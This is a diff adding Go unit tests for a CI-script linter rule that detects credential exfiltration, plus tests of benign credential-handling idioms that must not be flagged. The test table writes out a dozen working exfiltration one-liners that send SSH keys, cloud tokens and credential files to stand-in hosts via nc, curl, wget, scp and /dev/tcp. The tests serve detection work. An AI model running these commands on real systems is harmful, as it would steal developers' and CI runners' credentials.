@@ -209,3 +209,77 @@ job:
 		t.Fatalf("expected 1 finding for a socat bind shell, got %d", len(f))
 	}
 }
+
+func TestGL083_CredentialExfil(t *testing.T) {
+	cases := []struct {
+		name string
+		line string
+		kind string
+	}{
+		{"ssh key to netcat", `cat ~/.ssh/id_rsa | nc attacker.example.net 4444`, "credential piped to a network tool"},
+		{"aws creds via curl -F", `curl -F "f=@$HOME/.aws/credentials" https://collect.example.net/u`, "credential file uploaded"},
+		{"docker config via scp", `scp ~/.docker/config.json user@203.0.113.7:/tmp/`, "credential copied to a remote host"},
+		{"minted token via curl -d @-", `gcloud auth print-access-token | curl -d @- https://collect.example.net/t`, "credential piped to a network tool"},
+		{"kubeconfig via wget", `wget --post-file=/root/.kube/config https://collect.example.net/k`, "credential file uploaded"},
+		{"base64 stage in between", `base64 -w0 ~/.kube/config | curl --data-binary @- https://collect.example.net/k`, "credential piped to a network tool"},
+		{"curl -d @file", `curl -d @${HOME}/.netrc https://collect.example.net/n`, "credential file uploaded"},
+		{"curl -T", `curl -T ~/.git-credentials https://collect.example.net/g`, "credential file uploaded"},
+		{"gcloud adc upload", `curl --data-binary @$HOME/.config/gcloud/application_default_credentials.json https://collect.example.net/a`, "credential file uploaded"},
+		{"socket write", `cat /home/runner/.ssh/id_ed25519 > /dev/tcp/198.51.100.7/4444`, "credential written to a socket"},
+		{"ecr password to ncat", `aws ecr get-login-password --region eu-west-1 | ncat 198.51.100.7 4444`, "credential piped to a network tool"},
+		{"az token to curl upload", `az account get-access-token | curl -T - https://collect.example.net/z`, "credential piped to a network tool"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			f := findings083(t, "job:\n  script:\n    - '"+strings.ReplaceAll(tc.line, "'", "''")+"'\n")
+			if len(f) != 1 {
+				t.Fatalf("expected 1 finding, got %d", len(f))
+			}
+			if f[0].Severity != finding.Error {
+				t.Errorf("expected Error severity, got %s", f[0].Severity)
+			}
+			if !strings.Contains(f[0].Message, "sends a credential") || !strings.Contains(f[0].Message, tc.kind) {
+				t.Errorf("message %q does not describe %q", f[0].Message, tc.kind)
+			}
+		})
+	}
+}
+
+func TestGL083_CredentialHandlingIdioms(t *testing.T) {
+	for _, line := range []string{
+		`echo "$DOCKER_AUTH_CONFIG" > ~/.docker/config.json`,
+		`echo "$KUBECONFIG_B64" | base64 -d > ~/.kube/config`,
+		`cp "$KUBECONFIG" ~/.kube/config`,
+		`cat "$SSH_PRIVATE_KEY" | tr -d '\r' >> ~/.ssh/id_rsa`,
+		`aws ecr get-login-password --region eu-west-1 | docker login --username AWS --password-stdin 123456789012.dkr.ecr.eu-west-1.amazonaws.com`,
+		`gcloud auth print-access-token | helm registry login -u oauth2accesstoken --password-stdin europe-docker.pkg.dev`,
+		`az account get-access-token --query accessToken -o tsv | docker login myregistry.azurecr.io -u 00000000-0000-0000-0000-000000000000 --password-stdin`,
+		`curl -H "Authorization: Bearer $(gcloud auth print-access-token)" https://storage.googleapis.com/storage/v1/b/my-bucket`,
+		`scp ~/.ssh/id_ed25519.pub deploy@203.0.113.7:/tmp/`,
+		`scp -i ~/.ssh/id_rsa dist.tar.gz deploy@203.0.113.7:/srv/`,
+		`scp deploy@203.0.113.7:~/.kube/config ~/.kube/config`,
+		`rsync -e "ssh -i ~/.ssh/id_rsa" -az dist/ deploy@203.0.113.7:/srv/`,
+		`curl --netrc-file ~/.netrc -O https://files.example.com/artifact.tgz`,
+		`kubectl --kubeconfig ~/.kube/config get pods | tee pods.txt`,
+		`cat ~/.docker/config.json | jq '.auths | keys'`,
+		`chmod 600 ~/.ssh/id_rsa || true`,
+		`test -f ~/.aws/credentials || curl -s https://example.com/health`,
+	} {
+		if f := findings083(t, "job:\n  script:\n    - '"+strings.ReplaceAll(line, "'", "''")+"'\n"); len(f) != 0 {
+			t.Errorf("%s: expected no finding, got %q", line, f[0].Message)
+		}
+	}
+}
+
+func TestGL083_CredentialExfilLinesAreSeparate(t *testing.T) {
+	f := findings083(t, `
+job:
+  script:
+    - |
+      cat ~/.ssh/id_rsa > key.txt
+      curl -s https://example.com/health | nc -z localhost 8080
+`)
+	if len(f) != 0 {
+		t.Fatalf("expected no finding when source and sink are on different lines, got %d", len(f))
+	}
+}
